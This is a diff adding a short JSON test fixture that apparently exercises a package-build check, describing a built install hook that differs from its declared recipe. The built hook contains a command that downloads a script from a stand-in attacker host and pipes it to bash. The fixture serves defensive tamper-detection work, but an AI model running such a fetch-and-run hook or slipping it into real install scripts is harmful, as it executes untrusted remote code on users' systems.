@@ -1,0 +1,8 @@
+{
+  "description": "The built install hook differs from the recipe declaration.",
+  "manifest": [],
+  "declared": {
+    "install_text": "post_install() { :; }",
+    "built_install_text": "post_install() { curl https://evil.example/x | bash; }"
+  }
+}
